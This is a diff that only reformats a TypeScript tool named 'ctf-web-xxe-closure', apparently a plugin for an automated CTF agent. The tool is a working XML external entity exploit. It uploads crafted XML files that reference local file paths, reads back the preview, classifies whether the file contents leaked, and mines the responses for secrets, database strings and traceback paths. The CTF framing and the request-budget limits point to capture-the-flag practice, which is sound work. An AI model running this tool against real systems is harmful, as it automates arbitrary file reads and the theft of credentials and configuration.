@@ -7,7 +7,13 @@ function replaceAll(template: string, values: Record<string, string>) {
   return Object.entries(values).reduce((text, [key, value]) => text.replaceAll(`{${key}}`, value), template)
 }
 function safeSlug(value: string) {
-  return value.toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-|-$/g, "").slice(0, 60) || "xxe-closure"
+  return (
+    value
+      .toLowerCase()
+      .replace(/[^a-z0-9]+/g, "-")
+      .replace(/^-|-$/g, "")
+      .slice(0, 60) || "xxe-closure"
+  )
 }
 function xmlEntity(file: string, root = "ctf") {
   const escaped = file.replace(/\\/g, "/").replace(/"/g, "%22")
@@ -17,12 +23,19 @@ function parseJsonObject(raw: string | undefined, label: string): Record<string,
   if (!raw?.trim()) return {}
   const value = JSON.parse(raw)
   if (!value || typeof value !== "object" || Array.isArray(value)) throw new Error(`${label} must be a JSON object`)
-  return Object.fromEntries(Object.entries(value).filter(([, item]) => ["string", "number", "boolean"].includes(typeof item)).map(([key, item]) => [key, String(item)]))
+  return Object.fromEntries(
+    Object.entries(value)
+      .filter(([, item]) => ["string", "number", "boolean"].includes(typeof item))
+      .map(([key, item]) => [key, String(item)]),
+  )
 }
 function inferStored(text: string, filename: string): string {
   if (text.includes(filename)) return filename
   const candidates = [
-    ...Array.from(text.matchAll(/(?:stored|filename|file|path|upload)[^\n"']{0,80}[=:/>"']+([^\s"'<>]{2,180})/gi), (m) => m[1]),
+    ...Array.from(
+      text.matchAll(/(?:stored|filename|file|path|upload)[^\n"']{0,80}[=:/>"']+([^\s"'<>]{2,180})/gi),
+      (m) => m[1],
+    ),
     ...Array.from(text.matchAll(/(?:preview|uploaded)[\/?]([^\s"'<>]{2,180})/gi), (m) => m[1]),
   ]
   return candidates.find((item) => !/^https?:/i.test(item)) || filename
@@ -30,13 +43,21 @@ function inferStored(text: string, filename: string): string {
 function classify(text: string, status: number, target: string) {
   const normalized = text.replace(/\s+/g, " ").slice(0, 2_000)
   if (status === 404) return { state: "file_or_preview_not_found", reason: "HTTP 404" }
-  if (/entity\s+['"]?xxe|doctype|external entity|xml parsing disabled|forbidden/i.test(normalized) && !/\b(?:FLAG|flag|SECRET_KEY|\/run\/secrets)\b/.test(normalized)) {
+  if (
+    /entity\s+['"]?xxe|doctype|external entity|xml parsing disabled|forbidden/i.test(normalized) &&
+    !/\b(?:FLAG|flag|SECRET_KEY|\/run\/secrets)\b/.test(normalized)
+  ) {
     return { state: "xxe_blocked_or_parser_error", reason: normalized.slice(0, 500) }
   }
   if (/StartTag|invalid element name|not well-formed|parseerror|syntaxerror|traceback/i.test(normalized)) {
-    return { state: "read_success_parse_conflict", reason: "file content reached an XML/parser boundary", parser_error: normalized.slice(0, 500) }
+    return {
+      state: "read_success_parse_conflict",
+      reason: "file content reached an XML/parser boundary",
+      parser_error: normalized.slice(0, 500),
+    }
   }
-  if (text.trim() && !/&xxe;/.test(text)) return { state: "read_success", reason: `preview returned content for ${target}` }
+  if (text.trim() && !/&xxe;/.test(text))
+    return { state: "read_success", reason: `preview returned content for ${target}` }
   return { state: "no_confirmed_read", reason: normalized.slice(0, 500) || "empty response" }
 }
 function extractKeywords(text: string) {
@@ -50,10 +71,17 @@ function extractKeywords(text: string) {
     /kubernetes|k8s|secret(?:s)?\/[A-Za-z0-9._-]+/gi,
     /(?:sqlite|postgres|mysql|mongodb)[^\n]{0,160}/gi,
   ]
-  return [...new Set(patterns.flatMap((pattern) => Array.from(text.matchAll(pattern), (match) => match[0].trim()).filter(Boolean)))].slice(0, 80)
+  return [
+    ...new Set(
+      patterns.flatMap((pattern) => Array.from(text.matchAll(pattern), (match) => match[0].trim()).filter(Boolean)),
+    ),
+  ].slice(0, 80)
 }
 function inferTraceback(text: string) {
-  const files = [...text.matchAll(/(?:File|file)\s+["']([^"']+)["']\s*,?\s*line\s+(\d+)/gi)].map((m) => ({ file: m[1], line: Number(m[2]) }))
+  const files = [...text.matchAll(/(?:File|file)\s+["']([^"']+)["']\s*,?\s*line\s+(\d+)/gi)].map((m) => ({
+    file: m[1],
+    line: Number(m[2]),
+  }))
   const cwd = text.match(/(?:cwd|working directory|current directory)\s*[:=]\s*([^\s<]+)/i)?.[1]
   return { files, cwd }
 }
@@ -64,7 +92,10 @@ export default tool({
   args: {
     baseUrl: tool.schema.string(),
     sessionCookie: tool.schema.string().optional(),
-    reuseSession: tool.schema.boolean().optional().describe("Reuse the session cookie and Set-Cookie values across bounded requests; default true"),
+    reuseSession: tool.schema
+      .boolean()
+      .optional()
+      .describe("Reuse the session cookie and Set-Cookie values across bounded requests; default true"),
     loginPath: tool.schema.string().optional(),
     loginFieldsJson: tool.schema.string().optional().describe("JSON form fields for an optional login POST"),
     uploadPath: tool.schema.string(),
@@ -85,15 +116,18 @@ export default tool({
     const directory = directoryFromContext(context)
     const base = new URL(normalizeUrl(args.baseUrl))
     const loginFields = parseJsonObject(args.loginFieldsJson, "loginFieldsJson")
-    const budget = new CtfRequestBudget({
-      maxRequests: args.maxRequests,
-      maxStateChangingRequests: args.maxStateChangingRequests,
-      minIntervalMs: args.minIntervalMs,
-      timeoutMs: args.timeoutMs,
-      stopOnConnectionReset: true,
-      reuseSession: args.reuseSession ?? true,
-      allowedOrigin: base.origin,
-    }, args.sessionCookie)
+    const budget = new CtfRequestBudget(
+      {
+        maxRequests: args.maxRequests,
+        maxStateChangingRequests: args.maxStateChangingRequests,
+        minIntervalMs: args.minIntervalMs,
+        timeoutMs: args.timeoutMs,
+        stopOnConnectionReset: true,
+        reuseSession: args.reuseSession ?? true,
+        allowedOrigin: base.origin,
+      },
+      args.sessionCookie,
+    )
     const observations: Array<Record<string, unknown>> = []
     const reads: Array<Record<string, unknown>> = []
     let xxeVerified = false
@@ -102,11 +136,16 @@ export default tool({
 
     try {
       if (args.loginPath) {
-        const login = await budget.request(new URL(args.loginPath, base), {
-          method: "POST",
-          headers: { "content-type": "application/x-www-form-urlencoded" },
-          body: new URLSearchParams(loginFields).toString(),
-        }, true, "login")
+        const login = await budget.request(
+          new URL(args.loginPath, base),
+          {
+            method: "POST",
+            headers: { "content-type": "application/x-www-form-urlencoded" },
+            body: new URLSearchParams(loginFields).toString(),
+          },
+          true,
+          "login",
+        )
         observations.push({ ...login.observation })
       }
 
@@ -114,35 +153,79 @@ export default tool({
       const canaryName = `${prefix}-canary.xml`
       const canaryUpload = new FormData()
       canaryUpload.append(args.field, new Blob([xmlEntity(canaryFile)], { type: "application/xml" }), canaryName)
-      const canaryResponse = await budget.request(new URL(args.uploadPath, base), { method: "POST", body: canaryUpload }, true, "upload-canary")
+      const canaryResponse = await budget.request(
+        new URL(args.uploadPath, base),
+        { method: "POST", body: canaryUpload },
+        true,
+        "upload-canary",
+      )
       observations.push({ ...canaryResponse.observation })
       const canaryStored = inferStored(canaryResponse.text, canaryName)
-      const canaryPreview = await budget.request(new URL(replaceAll(args.previewPattern, { stored: canaryStored, filename: canaryStored }), base), {}, false, "preview-canary")
+      const canaryPreview = await budget.request(
+        new URL(replaceAll(args.previewPattern, { stored: canaryStored, filename: canaryStored }), base),
+        {},
+        false,
+        "preview-canary",
+      )
       observations.push({ ...canaryPreview.observation })
       const canaryClass = classify(canaryPreview.text, canaryPreview.observation.status || 0, canaryFile)
       xxeVerified = canaryClass.state === "read_success" || canaryClass.state === "read_success_parse_conflict"
-      reads.push({ target: canaryFile, stored: canaryStored, ...canaryClass, snippet: canaryPreview.text.slice(0, 1_000), keywords: extractKeywords(canaryPreview.text) })
+      reads.push({
+        target: canaryFile,
+        stored: canaryStored,
+        ...canaryClass,
+        snippet: canaryPreview.text.slice(0, 1_000),
+        keywords: extractKeywords(canaryPreview.text),
+      })
 
       const targets = args.targetFiles.slice(0, Math.max(1, Math.min(Math.floor(args.maxChunks ?? 12), 40)))
       for (const [index, target] of targets.entries()) {
         const filename = `${prefix}-${String(index + 1).padStart(2, "0")}.xml`
         const form = new FormData()
         form.append(args.field, new Blob([xmlEntity(target)], { type: "application/xml" }), filename)
-        const uploaded = await budget.request(new URL(args.uploadPath, base), { method: "POST", body: form }, true, `upload-${index + 1}`)
+        const uploaded = await budget.request(
+          new URL(args.uploadPath, base),
+          { method: "POST", body: form },
+          true,
+          `upload-${index + 1}`,
+        )
         observations.push({ ...uploaded.observation })
         const stored = inferStored(uploaded.text, filename)
-        const preview = await budget.request(new URL(replaceAll(args.previewPattern, { stored, filename }), base), {}, false, `preview-${index + 1}`)
+        const preview = await budget.request(
+          new URL(replaceAll(args.previewPattern, { stored, filename }), base),
+          {},
+          false,
+          `preview-${index + 1}`,
+        )
         observations.push({ ...preview.observation })
         const classification = classify(preview.text, preview.observation.status || 0, target)
         const trace = inferTraceback(preview.text)
-        reads.push({ target, stored, ...classification, traceback: trace, snippet: preview.text.slice(0, 4_000), keywords: extractKeywords(preview.text) })
+        reads.push({
+          target,
+          stored,
+          ...classification,
+          traceback: trace,
+          snippet: preview.text.slice(0, 4_000),
+          keywords: extractKeywords(preview.text),
+        })
       }
     } catch (error) {
-      stopReason = error instanceof BudgetStopError ? `${error.code}: ${error.message}` : error instanceof Error ? error.message : String(error)
+      stopReason =
+        error instanceof BudgetStopError
+          ? `${error.code}: ${error.message}`
+          : error instanceof Error
+            ? error.message
+            : String(error)
     }
 
     const allText = reads.map((item) => String(item.snippet || "")).join("\n")
-    const sourceHints = [...new Set(reads.flatMap((item) => (item.traceback as { files?: Array<{ file: string; line: number }> } | undefined)?.files || []))]
+    const sourceHints = [
+      ...new Set(
+        reads.flatMap(
+          (item) => (item.traceback as { files?: Array<{ file: string; line: number }> } | undefined)?.files || [],
+        ),
+      ),
+    ]
     const payload = {
       tool: "ctf-web-xxe-closure",
       target: base.toString(),
@@ -163,7 +246,11 @@ export default tool({
       },
       route_state: budget.routeState,
       stop_reason: stopReason,
-      next_probe: stopReason ? "resume with a larger bounded budget only after reviewing the last response" : xxeVerified ? "read inferred source/config paths at low frequency and verify a flag through an independent route" : "inspect upload/preview response and parser errors before trying another entity form",
+      next_probe: stopReason
+        ? "resume with a larger bounded budget only after reviewing the last response"
+        : xxeVerified
+          ? "read inferred source/config paths at low frequency and verify a flag through an independent route"
+          : "inspect upload/preview response and parser errors before trying another entity form",
     }
     const evidenceRef = await writeProbeEvidence(directory, args.challenge || safeSlug(base.host), payload)
     return JSON.stringify({ ...payload, evidence_ref: evidenceRef }, null, 2)
